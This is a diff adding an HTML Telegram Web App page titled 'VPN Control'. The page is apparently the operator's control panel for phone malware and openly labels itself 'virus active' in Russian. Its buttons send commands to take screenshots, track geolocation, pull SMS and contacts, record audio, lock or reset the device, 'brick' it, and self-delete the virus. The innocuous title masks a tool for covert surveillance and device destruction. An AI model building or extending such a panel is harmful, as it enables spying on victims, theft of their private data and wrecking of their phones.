@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VPN Control</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            background: #0D0D0D;
+            color: white;
+            font-family: Arial, sans-serif;
+            padding: 16px;
+            margin: 0;
+        }
+        .btn-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        button {
+            background: #1A4A2A;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        button:active {
+            transform: scale(0.95);
+            background: #2E7D32;
+        }
+        .danger {
+            background: #7A1A1A;
+        }
+        .danger:active {
+            background: #B71C1C;
+        }
+        .status {
+            background: #1E1E1E;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            text-align: center;
+            font-size: 14px;
+            color: #BDBDBD;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="status" id="status">🟢 Вирус активен</div>
+
+    <div class="btn-grid">
+        <button onclick="send('screen')">📸 Скриншот</button>
+        <button onclick="send('geo')">🗺 Геолокация</button>
+        <button onclick="send('sms')">📩 SMS</button>
+        <button onclick="send('contacts')">👤 Контакты</button>
+        <button onclick="send('audio')">🎤 Запись звука</button>
+        <button onclick="send('tiktok')">📱 TikTok</button>
+        <button onclick="send('yandex')">🌐 Яндекс</button>
+        <button onclick="send('wallpaper')">🖼 Сменить обои</button>
+        <button onclick="send('popup')">💬 Сообщение</button>
+        <button onclick="send('alert')">🔊 Сообщение + звук</button>
+        <button onclick="send('lock')">🔒 Блокировка</button>
+        <button onclick="send('reset')">📴 Сброс</button>
+        <button onclick="send('sleep')">💤 Спящий режим</button>
+        <button onclick="send('status')">📋 Статус</button>
+        <button class="danger" onclick="send('brick')">🧱 Кирпич</button>
+        <button class="danger" onclick="send('selfdestruct')">🗑 Удалить вирус</button>
+    </div>
+
+    <script>
+        function send(cmd) {
+            Telegram.WebApp.sendData(cmd);
+            Telegram.WebApp.showAlert('✅ Команда отправлена: ' + cmd);
+        }
+        Telegram.WebApp.ready();
+    </script>
+</body>
+</html>
